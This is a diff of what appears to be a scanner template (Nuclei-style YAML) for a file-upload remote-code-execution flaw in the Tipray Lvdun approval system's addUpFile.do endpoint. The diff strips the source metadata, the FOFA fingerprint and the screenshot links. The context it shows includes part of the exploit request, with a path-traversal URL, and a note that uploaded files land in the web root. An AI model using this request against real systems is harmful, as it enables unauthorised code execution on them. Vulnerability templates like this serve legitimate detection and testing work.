@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统 addUpFile.do 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wrbwwc93rr0a6307'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wrbwwc93rr0a6307
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
   - 'POST /trwfe/service/.%2E/file/addUpFile.do HTTP/1.1
@@ -52,12 +48,7 @@ http:
     ------WebKitFormBoundaryJ89XK7WxiQuU7uq1--
 
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944151633-4e4c62b8-9a14-440d-a6b5-7c97ada383f5.png)
-
-    PS：回显必须是true，文件会上传到根目录
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1755944151917-fc170309-f7d7-4cb4-852c-0dcc75ec25ca.png)'
+    PS：回显必须是true，文件会上传到根目录'
   redirects: false
   matchers:
   - status:
